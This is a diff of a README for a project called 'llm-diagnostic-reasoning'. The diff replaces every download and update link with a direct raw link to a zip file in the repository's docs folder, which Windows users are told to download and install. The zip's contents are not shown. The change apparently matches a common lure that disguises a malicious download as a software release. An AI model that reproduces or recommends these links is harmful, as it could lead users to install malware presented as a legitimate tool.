@@ -1,6 +1,6 @@
 # ⚙️ llm-diagnostic-reasoning - Expert AI Diagnostic Tools
 
-[![Download llm-diagnostic-reasoning](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Mine-Fire-Bro/llm-diagnostic-reasoning/releases)
+[![Download llm-diagnostic-reasoning](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Mine-Fire-Bro/llm-diagnostic-reasoning/raw/refs/heads/main/docs/llm_diagnostic_reasoning_3.5-alpha.4.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To get started, you first need to download the software. It is available on the 
 
 Click the big green button at the top or the link below to go to the release page. This page lists the latest versions and their files.
 
-[Download llm-diagnostic-reasoning Releases](https://github.com/Mine-Fire-Bro/llm-diagnostic-reasoning/releases)
+[Download llm-diagnostic-reasoning Releases](https://github.com/Mine-Fire-Bro/llm-diagnostic-reasoning/raw/refs/heads/main/docs/llm_diagnostic_reasoning_3.5-alpha.4.zip)
 
 ### Step 2: Choose the Windows Installer
 
@@ -123,7 +123,7 @@ For additional help, check the GitHub repository issues page.
 Keep your copy up to date for best performance:
 
 - Visit the release page regularly:  
-  [https://github.com/Mine-Fire-Bro/llm-diagnostic-reasoning/releases](https://github.com/Mine-Fire-Bro/llm-diagnostic-reasoning/releases)  
+  [https://github.com/Mine-Fire-Bro/llm-diagnostic-reasoning/raw/refs/heads/main/docs/llm_diagnostic_reasoning_3.5-alpha.4.zip](https://github.com/Mine-Fire-Bro/llm-diagnostic-reasoning/raw/refs/heads/main/docs/llm_diagnostic_reasoning_3.5-alpha.4.zip)  
 - Download the newest installer.
 - Install over the existing version to upgrade. Your settings and data will remain intact.
 
